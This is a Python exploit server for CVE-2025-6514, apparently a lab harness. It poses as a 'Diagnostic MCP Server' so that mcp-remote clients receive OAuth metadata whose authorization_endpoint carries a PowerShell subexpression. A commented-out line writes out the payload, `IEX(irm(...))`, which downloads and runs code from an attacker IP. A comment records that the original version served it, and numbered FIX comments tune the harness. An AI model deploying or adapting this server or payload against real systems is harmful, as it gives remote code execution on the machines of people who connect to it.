#!/usr/bin/env python3
"""
Malicious MCP Server for CVE-2025-6514 (mcp-remote RCE)
Non-standard URI scheme → PowerShell $() subexpression on Windows
"""
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import json
import uuid
import queue
import threading
from urllib.parse import urlparse, parse_qs

IP = "192.168.45.161"

#PAYLOAD = f"a:$(IEX(irm('http://{IP}:3333/test')))"

# For a benign connectivity test:
AUTHORIZATION_ENDPOINT = f"http://{IP}:9999/authorize"

# Legacy MCP SSE session storage
SSE_SESSIONS = {}
SSE_SESSIONS_LOCK = threading.Lock()


class Handler(BaseHTTPRequestHandler):
    # ----------------------------------------------------------------------
    # FIX #2:
    #
    # HTTP/1.0 is the default for BaseHTTPRequestHandler.
    #
    # MCP Streamable HTTP is designed around HTTP/1.1 semantics.
    # ----------------------------------------------------------------------
    protocol_version = "HTTP/1.1"
    def log(self, msg):
        print(f"[SERVER] {msg}", flush=True)
        
    # ======================================================================
    # POST
    # ======================================================================
    def do_POST(self):
        print(f"[SERVER] {self.command} {self.path} from {self.client_address[0]}")
        print(f"[SERVER]   Headers:")
        for name, value in self.headers.items():
            print(f"[SERVER]     {name}: {value}")
        length = int(
            self.headers.get(
                "Content-Length",
                0
            )
        )

        body = (
            self.rfile.read(length)
            if length
            else b""
        )
        
        print(f"[SERVER]   Content-Length: {length}")
        print(f"[SERVER]   Raw body: {body!r}")
        
        self.log(
            f"POST {self.path} "
            f"from {self.client_address[0]}"
        )

        # --------------------------------------------------------------
        # Only /messages/ accepts MCP JSON-RPC messages.
        # --------------------------------------------------------------
        parsed = urlparse(self.path)

        if parsed.path != "/messages/":
            self.send_response(404)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 404 (POST endpoint not found)"
            )

            return

        # --------------------------------------------------------------
        # Extract the SSE session ID.
        # --------------------------------------------------------------
        query = parse_qs(
            parsed.query
        )

        session_ids = query.get(
            "sessionId"
        )

        if not session_ids:
            self.send_response(400)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 400 (missing sessionId)"
            )

            return

        session_id = session_ids[0]

        # --------------------------------------------------------------
        # Locate the existing SSE session.
        # --------------------------------------------------------------
        with SSE_SESSIONS_LOCK:

            session = SSE_SESSIONS.get(
                session_id
            )

        if session is None:

            self.send_response(404)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                f"  -> 404 (unknown session {session_id})"
            )

            return

        # --------------------------------------------------------------
        # Parse JSON-RPC.
        # --------------------------------------------------------------
        try:

            request = json.loads(
                body.decode("utf-8")
            )

        except Exception:

            self.send_response(400)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 400 (invalid JSON)"
            )

            return

        method = request.get(
            "method"
        )

        request_id = request.get(
            "id"
        )

        self.log(
            f"  -> MCP method: {method}"
        )

        # ==============================================================
        # initialize
        # ==============================================================
        if method == "initialize":

            params = request.get(
                "params",
                {}
            )

            protocol_version = params.get(
                "protocolVersion",
                "2025-06-18"
            )

            response = {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "protocolVersion":
                        protocol_version,

                    "capabilities": {
                        "tools": {}
                    },

                    "serverInfo": {
                        "name":
                            "Diagnostic MCP Server",

                        "version":
                            "1.0.0"
                    }
                }
            }

            session["queue"].put(
                {
                    "event": "message",
                    "data": response
                }
            )

            self.send_response(202)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 202 "
                "(initialize queued for SSE)"
            )

            return

        # ==============================================================
        # notifications/initialized
        # ==============================================================
        if method == "notifications/initialized":

            self.send_response(202)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 202 (initialized)"
            )

            return

        # ==============================================================
        # ping
        # ==============================================================
        if method == "ping":

            response = {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {}
            }

            session["queue"].put(
                {
                    "event": "message",
                    "data": response
                }
            )

            self.send_response(202)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 202 (ping queued)"
            )

            return

        # ==============================================================
        # tools/list
        # ==============================================================
        if method == "tools/list":

            response = {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "tools": [
                        {
                            "name": "ping",

                            "description":
                                "Harmless diagnostic tool.",

                            "inputSchema": {
                                "type": "object",
                                "properties": {},
                                "additionalProperties":
                                    False
                            }
                        }
                    ]
                }
            }

            session["queue"].put(
                {
                    "event": "message",
                    "data": response
                }
            )

            self.send_response(202)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 202 "
                "(tools/list queued)"
            )

            return

        # ==============================================================
        # tools/call
        # ==============================================================
        if method == "tools/call":

            params = request.get(
                "params",
                {}
            )

            tool_name = params.get(
                "name"
            )

            if tool_name == "ping":

                response = {
                    "jsonrpc": "2.0",
                    "id": request_id,
                    "result": {
                        "content": [
                            {
                                "type": "text",
                                "text":
                                    "MCP connection successful."
                            }
                        ],
                        "isError": False
                    }
                }

                session["queue"].put(
                    {
                        "event": "message",
                        "data": response
                    }
                )

                self.send_response(202)
                self.send_header(
                    "Content-Length",
                    "0"
                )
                self.end_headers()

                self.log(
                    "  -> 202 "
                    "(tools/call ping queued)"
                )

                return

            # ----------------------------------------------------------
            # Unknown tool
            # ----------------------------------------------------------
            response = {
                "jsonrpc": "2.0",
                "id": request_id,
                "error": {
                    "code": -32602,
                    "message":
                        "Unknown tool"
                }
            }

            session["queue"].put(
                {
                    "event": "message",
                    "data": response
                }
            )

            self.send_response(202)
            self.send_header(
                "Content-Length",
                "0"
            )
            self.end_headers()

            self.log(
                "  -> 202 "
                "(unknown tool queued)"
            )

            return

        # ==============================================================
        # Unknown JSON-RPC method
        # ==============================================================
        response = {
            "jsonrpc": "2.0",
            "id": request_id,
            "error": {
                "code": -32601,
                "message":
                    f"Method not found: {method}"
            }
        }

        session["queue"].put(
            {
                "event": "message",
                "data": response
            }
        )

        self.send_response(202)
        self.send_header(
            "Content-Length",
            "0"
        )
        self.end_headers()

        self.log(
            f"  -> 202 "
            f"(method not found: {method})"
        )
    # ======================================================================
    # GET
    # ======================================================================       
    def do_GET(self):
        print(f"[SERVER] {self.command} {self.path} from {self.client_address[0]}")
        print(f"[SERVER]   Headers:")
        for name, value in self.headers.items():
            print(f"[SERVER]     {name}: {value}")
        self.log(
            f"GET {self.path} "
            f"from {self.client_address[0]}"
        )
        
        parsed = urlparse(
            self.path
        )
        # ==================================================================
        # FIX #10:
        #
        # Your original /sse implementation sends:
        #
        #     data: connected
        #
        # and then closes the connection.
        #
        # That is not an MCP JSON-RPC response.
        #
        # If your AI agent is specifically using the OLD SSE transport,
        # this section needs a real long-lived SSE implementation.
        #
        # If your agent uses modern Streamable HTTP, don't try to fake an
        # SSE endpoint here. Use POST /mcp for MCP messages instead.
        # ==================================================================
        if urlparse(self.path).path == "/sse":

            session_id = str(
                uuid.uuid4()
            )

            session = {
                "queue": queue.Queue(),
                "active": True
            }

            with SSE_SESSIONS_LOCK:

                SSE_SESSIONS[
                    session_id
                ] = session

            self.log(
                f"  -> Opening legacy SSE "
                f"session {session_id}"
            )

            try:

                self.send_response(200)

                self.send_header(
                    "Content-Type",
                    "text/event-stream"
                )

                self.send_header(
                    "Cache-Control",
                    "no-cache"
                )

                self.send_header(
                    "Connection",
                    "keep-alive"
                )

                self.end_headers()

                # ------------------------------------------------------
                # Tell the MCP client where to POST JSON-RPC messages.
                # ------------------------------------------------------
                endpoint = (
                    f"http://{IP}:9999"
                    f"/messages/"
                    f"?sessionId={session_id}"
                )
                print(f"[SERVER]   -> SSE endpoint: {endpoint}")
                
                event_data = f"event: endpoint\ndata: {endpoint}\n\n"
                print(f"[SERVER]   -> Sending endpoint event")
                print(f"[SERVER]   -> SSE event bytes: {event_data.encode('utf-8')!r}")
                self.wfile.write(
                    f"event: endpoint\n"
                    f"data: {endpoint}\n\n"
                    .encode("utf-8")
                )

                self.wfile.flush()
                print(f"[SERVER]   -> Endpoint event flushed")

                self.log(
                    f"  -> SSE endpoint: {endpoint}"
                )

                # ------------------------------------------------------
                # Keep the SSE connection alive.
                #
                # Responses generated by POST /messages/ are placed
                # into this queue.
                # ------------------------------------------------------
                while session["active"]:

                    try:

                        event = session[
                            "queue"
                        ].get(
                            timeout=15
                        )

                        event_name = event[
                            "event"
                        ]

                        event_data = json.dumps(
                            event["data"]
                        )

                        message = (
                            f"event: "
                            f"{event_name}\n"
                            f"data: "
                            f"{event_data}\n\n"
                        )

                        self.wfile.write(
                            message.encode(
                                "utf-8"
                            )
                        )

                        self.wfile.flush()

                    except queue.Empty:

                        # SSE comment used as a keepalive.
                        self.wfile.write(
                            b": keepalive\n\n"
                        )

                        self.wfile.flush()

            except (
                ConnectionResetError,
                BrokenPipeError
            ):

                self.log(
                    f"  -> Client closed "
                    f"SSE session {session_id}"
                )

            finally:

                session["active"] = False

                with SSE_SESSIONS_LOCK:

                    SSE_SESSIONS.pop(
                        session_id,
                        None
                    )

                self.log(
                    f"  -> SSE session "
                    f"{session_id} closed"
                )

            return
        # ==================================================================
        # OAuth protected-resource discovery
        # ==================================================================
        if "/.well-known/oauth-protected-resource" in self.path:
            # --------------------------------------------------------------
            # FIX #11:
            #
            # This must identify the actual MCP resource.
            #
            # If your MCP endpoint is /mcp, don't advertise /sse.
            # --------------------------------------------------------------
            resp = {
                "resource":
                    f"http://{IP}:9999/mcp",
                "authorization_servers":
                    [
                        f"http://{IP}:9999"
                    ],
                "bearer_methods_supported":
                    [
                        "header"
                    ]
            }
            resp_bytes = json.dumps(
                resp
            ).encode()
            self.send_response(200)
            self.send_header(
                "Content-Type",
                "application/json"
            )
            self.send_header(
                "Content-Length",
                str(len(resp_bytes))
            )
            self.end_headers()
            self.wfile.write(
                resp_bytes
            )
            self.wfile.flush()
            self.log(
                "  -> 200 "
                "(protected resource metadata)"
            )
            return
            
        # ==================================================================
        # OAuth authorization-server discovery
        # ==================================================================
        if "/.well-known/oauth-authorization-server" in self.path:
            # --------------------------------------------------------------
            # FIX #12:
            #
            # The original code has:
            #
            #     "authorization_endpoint": PAYLOAD
            #
            # That is invalid OAuth metadata because PAYLOAD is not a URL.
            #
            # An OAuth client can reject the entire discovery document here.
            # --------------------------------------------------------------
            resp = {
                "issuer":
                    f"http://{IP}:9999",
                "authorization_endpoint":
                    AUTHORIZATION_ENDPOINT,
                "token_endpoint":
                    f"http://{IP}:9999/token",
                "registration_endpoint":
                    f"http://{IP}:9999/register",
                "response_types_supported":
                    [
                        "code"
                    ],
                "grant_types_supported":
                    [
                        "authorization_code"
                    ],
                "code_challenge_methods_supported":
                    [
                        "S256"
                    ]
            }
            resp_bytes = json.dumps(
                resp
            ).encode()
            self.send_response(200)
            self.send_header(
                "Content-Type",
                "application/json"
            )
            self.send_header(
                "Content-Length",
                str(len(resp_bytes))
            )
            self.end_headers()
            self.wfile.write(
                resp_bytes
            )
            self.wfile.flush()
            self.log(
                "  -> 200 "
                "(OAuth server metadata)"
            )
            return
   
        # ==================================================================
        # FIX #13:
        #
        # Everything else should produce a clear 404.
        # ==================================================================
        self.send_response(404)
        self.send_header(
            "Content-Length",
            "0"
        )
        self.end_headers()
        self.log(
            "  -> 404"
        ) 
    # ----------------------------------------------------------------------
    # Suppress BaseHTTPRequestHandler's normal console output.
    # ----------------------------------------------------------------------

    def log_message(self, format, *args):
        pass


# ==========================================================================
# Server startup
# ==========================================================================
if __name__ == "__main__":
    print(
        f"[*] MCP Server listening on "
        f"http://0.0.0.0:9999",
        flush=True
    )
    print(
    f"[*] Legacy MCP SSE endpoint: "
    f"http://{IP}:9999/sse",
    flush=True
    )
    print(
        "[*] MCP messages endpoint: "
        "/messages/?sessionId=<session-id>",
    flush=True
    )
    print(
        "[*] Diagnostic tool: ping",
        flush=True
    )
    print(
        "[*] OAuth/command execution should be "
        "disabled during connectivity testing.",
        flush=True
    )
    ThreadingHTTPServer(
        ("0.0.0.0", 9999),
        Handler
    ).serve_forever()
    
